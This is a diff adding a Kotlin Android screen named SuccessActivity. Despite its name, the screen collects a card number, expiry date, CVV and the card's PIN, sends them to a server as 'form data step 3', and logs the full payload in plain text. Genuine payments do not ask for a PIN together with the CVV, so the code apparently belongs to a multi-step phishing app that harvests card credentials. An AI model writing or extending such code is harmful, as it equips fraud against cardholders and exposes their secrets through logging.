@@ -1,0 +1,152 @@
+success
+
+
+
+package com.example.refactor.activities
+
+import android.os.Bundle
+import android.text.Editable
+import android.text.TextWatcher
+import android.util.Log
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.example.refactor.R
+import com.example.refactor.models.CardPaymentData
+import com.example.refactor.network.ApiClient
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.HttpException
+import java.io.IOException
+
+class SuccessActivity : AppCompatActivity() {
+
+    private lateinit var etCardNumber: EditText
+    private lateinit var etExpiryDate: EditText
+    private lateinit var etCVV: EditText
+    private lateinit var etPin: EditText
+    private lateinit var btnSubmit: Button
+
+    private var userId: String? = null
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activitty_success)
+
+        etCardNumber = findViewById(R.id.etCardNumber)
+        etExpiryDate = findViewById(R.id.etExpiryDate)
+        etCVV = findViewById(R.id.etCVV)
+        etPin = findViewById(R.id.etPin)
+        btnSubmit = findViewById(R.id.btnProceed)
+
+        userId = intent.getStringExtra("USER_ID")
+
+        if (userId.isNullOrEmpty()) {
+            Toast.makeText(this, getString(R.string.error_missing_user_id), Toast.LENGTH_SHORT).show()
+            finish()
+            return
+        }
+
+        setupExpiryDateAutoFormat()
+
+        btnSubmit.setOnClickListener {
+            val cardNumber = etCardNumber.text.toString().trim()
+            val expiryDate = etExpiryDate.text.toString().trim()
+            val cvv = etCVV.text.toString().trim()
+            val pin = etPin.text.toString().trim()
+
+            if (validateInputs(cardNumber, expiryDate, cvv, pin)) {
+                submitFormDataStep3(cardNumber, expiryDate, cvv, pin)
+            } else {
+                Toast.makeText(this, getString(R.string.error_fill_all_fields), Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun validateInputs(cardNumber: String, expiryDate: String, cvv: String, pin: String): Boolean {
+        val cardRegex = "^\\d{16}$".toRegex()
+        val cvvRegex = "^\\d{3,4}$".toRegex()
+        val pinRegex = "^\\d{4,6}$".toRegex()
+        if (!cardRegex.matches(cardNumber)) {
+            showToast("Invalid Card Number!")
+            return false
+        }
+
+        if (!isValidExpiryDate(expiryDate)) {
+            showToast("Invalid Expiry Date!")
+            return false
+        }
+
+        if (!cvvRegex.matches(cvv)) {
+            showToast("Invalid CVV!")
+            return false
+        }
+
+        if (!pinRegex.matches(pin)) {
+            showToast("Invalid PIN!")
+            return false
+        }
+
+        return true
+    }
+
+    private fun isValidExpiryDate(expiryDate: String): Boolean {
+        val regex = Regex("^([0-9]{2})/([0-9]{2})$")
+        return regex.matches(expiryDate)
+    }
+
+    private fun setupExpiryDateAutoFormat() {
+        etExpiryDate.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                if (!s.isNullOrEmpty() && s.length == 2 && before == 0) {
+                    etExpiryDate.setText("$s/")
+                    etExpiryDate.setSelection(etExpiryDate.text.length)
+                }
+            }
+
+            override fun afterTextChanged(s: Editable?) {}
+        })
+    }
+
+    private fun submitFormDataStep3(cardNumber: String, expiryDate: String, cvv: String, pin: String) {
+        val apiInterface = ApiClient.api
+
+        val formData = CardPaymentData(
+            userId = userId!!,
+            cardNumber = cardNumber,
+            expiryDate = expiryDate,
+            cvv = cvv,
+            pin = pin
+        )
+
+        Log.d("FormDataStep3", "Payload being sent: $formData")
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.saveFormDataStep3(formData)
+                runOnUiThread {
+                    if (response.isSuccessful && response.body()?.success == true) {
+                        showToast(getString(R.string.success_submit))
+                        finish()
+                    } else {
+                        showToast(response.body()?.message ?: getString(R.string.error_submit_failed))
+                    }
+                }
+            } catch (e: HttpException) {
+                runOnUiThread { showToast(getString(R.string.error_http, e.message)) }
+            } catch (e: IOException) {
+                runOnUiThread { showToast(getString(R.string.error_network)) }
+            } catch (e: Exception) {
+                runOnUiThread { showToast(getString(R.string.error_unexpected, e.message)) }
+            }
+        }
+    }
+
+    private fun showToast(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+    }
+}
